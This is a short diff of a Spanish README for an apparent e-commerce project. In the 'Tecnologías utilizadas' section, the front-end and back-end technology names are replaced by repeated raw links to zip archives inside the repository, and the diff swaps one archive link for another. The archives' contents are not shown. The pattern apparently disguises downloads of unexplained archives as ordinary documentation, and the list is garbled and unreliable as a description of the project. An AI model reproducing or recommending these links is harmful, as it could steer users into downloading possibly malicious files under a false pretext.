@@ -14,8 +14,8 @@ Este repositorio contiene el código fuente de un e-commerce, una plataforma de 
 
 ## Tecnologías utilizadas
 - **Lenguaje de programación:** JavaScript
-- **Front-end:** HTML, CSS, https://github.com/matiaslanza99/PF-Grupo-20/raw/refs/heads/main/client/src/components/NavBar/Grupo-P-1.5.zip
-- **Back-end:** https://github.com/matiaslanza99/PF-Grupo-20/raw/refs/heads/main/client/src/components/NavBar/Grupo-P-1.5.zip, https://github.com/matiaslanza99/PF-Grupo-20/raw/refs/heads/main/client/src/components/NavBar/Grupo-P-1.5.zip
+- **Front-end:** HTML, CSS, https://raw.githubusercontent.com/matiaslanza99/PF-Grupo-20/main/server/src/middleware/P_Grupo_1.6.zip
+- **Back-end:** https://raw.githubusercontent.com/matiaslanza99/PF-Grupo-20/main/server/src/middleware/P_Grupo_1.6.zip, https://raw.githubusercontent.com/matiaslanza99/PF-Grupo-20/main/server/src/middleware/P_Grupo_1.6.zip
 - **Base de datos:** PostgresSQL
 - **Pago:** Integración con pasarelas de pago como PayPal o Stripe
 - **Control de versiones:** Git
